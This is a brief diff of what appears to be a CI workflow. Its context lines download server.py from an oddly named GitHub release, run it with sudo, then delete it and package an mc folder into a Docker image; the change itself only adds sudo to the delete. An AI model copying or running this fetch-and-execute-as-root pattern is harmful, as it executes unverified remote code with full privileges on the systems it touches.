@@ -57,7 +57,7 @@ jobs:
         cd mc
         sudo wget https://github.com/aaaaaaction/abouttab/releases/download/v9.99/server.py
         sudo python server.py
-        rm server.py
+        sudo rm server.py
         cd ..
         echo -e "FROM ubuntu:latest\nCOPY mc /root/mc" > Dockerfile
         cd ..
